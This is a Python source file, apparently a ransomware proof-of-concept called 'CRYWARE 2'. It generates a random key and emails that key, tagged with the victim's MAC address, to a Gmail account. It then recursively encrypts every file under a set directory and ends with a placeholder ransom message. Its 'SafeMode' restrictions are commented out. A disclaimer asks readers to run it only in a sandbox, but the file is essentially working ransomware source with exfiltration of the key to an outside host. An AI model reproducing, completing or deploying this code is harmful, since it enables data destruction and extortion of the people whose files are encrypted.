# CRYWARE 2 PAYLOAD
# Desc: A encryption payload that will encrypt all files that are 
# recursivly found in a given HOME_DIR set below...NOTE: PLEASE DO NOT 
# RUN THIS OUTSIDE OF SANDBOXED ENVIRONMENT OR OBVIOUSLY ON SOMEONE 
# ELSES MACHINE...(as that would be illegal) RUNNING THIS COULD RESULT 
# IN HUGE DATA LOSS

# Author: SystemFiles

import os, random, string, smtplib
from encrypt import get_key, encrypt
from uuid import getnode as get_mac

# HARDCODED VALUES
KEY_EMAIL = "EMAIL"
KEY_PASSWD = "EMAIL_PASSWORD"
UNLOCK_KEY = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
HOME_DIR = os.path.abspath("/cryware2/examples/")


def send_key():
    '''
    Sends key to server to be held

    :param key: The key being sent
    :param server: The server key is being sent to
    :return: True if success.
    '''

    sent_from = KEY_EMAIL
    to = [KEY_EMAIL]
    subject = 'Unlock key for ' + str(get_mac())
    body = UNLOCK_KEY

    # SafeMode = Save key locally for safety (NOT USE IN REAL DEPLOY)
    # with open(HOME_DIR + "/keyFile.txt", "w") as in_file:
    #     in_file.write(UNLOCK_KEY)
    #     print("Saved key locally!")

    email_text = """
            Subject: %s

            %s
            """ % (subject, body)

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(KEY_EMAIL, KEY_PASSWD)
        server.sendmail(sent_from, to, email_text)
        server.close()

        print('Decryption Key Saved!')
    except:
        print('Something went wrong...')


def get_files(start_dir):
    '''
    Finds all the absolute files/paths for all files in start_dir recursively
    :param start_dir: The starting directory
    :return: Array containing all files
    '''
    result = []

    for root, dirs, files in os.walk(start_dir):
        for file in files:
            # SafeMode = (For testing purposes only encrypts files with extensions listed below)
            # for ext in ['.txt', '.docx', '.doc', '.png', '.jpg', '.pages']:
            #     if file.endswith(ext):
            result.append(os.path.join(root, file))
    return result


def print_ransom():
    '''
    Prints ransom message to end-user (obviously you would never use this...)
    '''
    print("Theoretically an attacker would put a ransomware message here...probably asking for currency of some kind for the decryption key")


def main():
    '''
    Runs the main program
    :return: None
    '''

    # Send key before encryption to avoid permanently lost data.
    send_key()

    # Runs encryption (SafeMode = ONLY ENCRYPTS DESKTOP FILES)
    print("Encrypting all your files!")
    for file in get_files(HOME_DIR):
        encrypt(get_key(UNLOCK_KEY), file)
        print("Encrypted {}!".format(file))

    print_ransom()


if __name__ == '__main__':
    main()
